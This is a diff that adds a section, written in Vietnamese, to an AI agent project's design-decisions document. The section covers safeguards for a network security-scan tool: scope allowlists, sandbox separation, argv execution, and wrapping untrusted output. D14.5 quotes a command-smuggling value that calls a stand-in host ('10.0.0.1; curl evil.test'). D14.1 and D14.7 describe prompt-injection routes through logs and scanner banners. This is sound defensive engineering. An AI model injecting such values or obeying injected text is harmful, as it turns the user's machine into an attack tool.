@@ -442,3 +442,23 @@ Bối cảnh: `docs/security-review.md` mục 2 (S1) chứng minh `read_file`/`g
 * **D13.5 — Tool trong crate riêng `beanagent-billing`.** Giữ đúng nguyên tắc "domain tách biệt"
   của M21–M24: billing không lẫn vào `beanagent-security` (đó là crate SSRF/sandbox) hay
   `beanagent-tools` (đó là trait/registry). Thêm source ở M22a rẻ hơn nhiều so với dồn về sau.
+
+## 14. Security-scan (D14.x — 2026-09-26)
+
+Chủ dự án đã **mở khóa M23** (S1 đã vá, `make check` xanh) và chọn `[[infra_scope]]` **rỗng**
+(fail-closed) cho tới khi họ điền target thật. Công cụ mới: `crates/beanagent-scan`.
+
+| # | Quyết định | Vì sao | Hệ quả đã chấp nhận |
+|---|-----------|--------|---------------------|
+| D14.1 | `infra_scope` **rỗng ⇒ từ chối mọi thứ** | Agent có quyền chạy lệnh. Không có allowlist thì chỉ cần một dòng log/ticket chứa "quét 8.8.8.8" là máy chủ người dùng thành công cụ tấn công do chính họ vận hành. Mặc định an toàn phải là "không quét được gì". | Mở tính năng phải khai trước scope, nếu không mọi lần quét chỉ trả về lời từ chối (có log cảnh báo lúc khởi động). |
+| D14.2 | Scope **chỉ nhận `ip`/`cidr`, cấm `hostname`** | Code kiểm scope và scanner sẽ phân giải DNS ở **hai thời điểm khác nhau**: kẻ điều khiển DNS trả IP được phép lúc kiểm tra rồi đổi sang IP khác lúc scanner chạy (TOCTOU). | Chấp nhận phải nhập IP/CIDR thay vì tên dễ nhớ. |
+| D14.3 | `[security_scan.sandbox]` **tách khỏi** `[security.sandbox]` | Scanner **bắt buộc** phải có mạng để tới target, còn `run_shell` phải `--network none`. Dùng chung một cấu hình sẽ vô hiệu hoá cách ly của `run_shell` — đổi `network=true` cho scanner là mất an toàn của mọi lệnh shell. | Hai khối cấu hình riêng; `validate()` từ chối `network = false`. |
+| D14.4 | `mode = "host"` **bắt buộc** `allow_host = true` | Cùng lý do với `[security.sandbox]`: chạy scanner ngoài container là hạ cấp cách ly, phải là hành động tường minh chứ không phải mặc định. | Cấu hình `host` mà quên cờ sẽ **không khởi động**, thay vì chạy âm thầm. |
+| D14.5 | Tool **không có tham số `command`**; code tự dựng argv, exec thẳng (không `sh -c`) | `Sandbox::run` nhận chuỗi rồi chạy `sh -c`, nên `; \| & $()` trong tham số có ý nghĩa với shell — model chỉ cần truyền `target = "10.0.0.1; curl evil.test"` là chạy lệnh tuỳ ý ngoài phạm vi. Thêm `Sandbox::run_argv` (exec thẳng) và đặt target sau `--`. | Scanner chỉ hỗ trợ dạng lệnh nmap cố định; muốn đổi scanner phải sửa `ScannerCmd`/cấu hình chứ không nhét lệnh từ model. |
+| D14.6 | `security_scan` khai báo `Risk::Dangerous` | M23 yêu cầu "không có cho phép trong phiên". `Policy::decide` **đã** trả `allow_in_session: false` cho mức này, nên không cần (và không được) viết logic riêng — dùng lại đúng một đường quyết định. | Hai test khẳng định kể cả khi đã allow-in-session và khi đã đọc untrusted, tool vẫn hỏi. |
+| D14.7 | Output scanner bọc `<untrusted_content>` | Banner mà scanner đọc được từ target do **kẻ tấn công kiểm soát** — đúng loại payload mà S1 (2026-09-26) đã vá cho `read_file`/`run_shell` (mục 22.5 áp cho MỌI tool có nguồn ngoài lõi). | Test khẳng định payload cài `</untrusted_content>` bị escape, khối chỉ còn **một** thẻ đóng. |
+| D14.8 | Tự viết so khớp CIDR, **không** thêm crate `ipnet` | Vài chục dòng `std` đủ; thêm dependency vào công cụ bảo mật để tránh 20 dòng tự viết là đánh đổi xấu (mục 15.10 chuỗi cung ứng). | Phải tự bảo đảm IPv4/IPv6 không bao giờ "rơi" xuống khớp chéo — có test riêng. |
+
+**Bằng chứng:** `crates/beanagent-scan/tests/scan.rs` (12 test) + `crates/beanagent-scan/src/scope.rs`
+(6 unit test) + `crates/beanagent-types/tests/config.rs` (9 test M23). Test dùng sandbox chế
+độ host với script tự tạo, nên **không cần Docker, không cần mạng, không cần image scanner**.
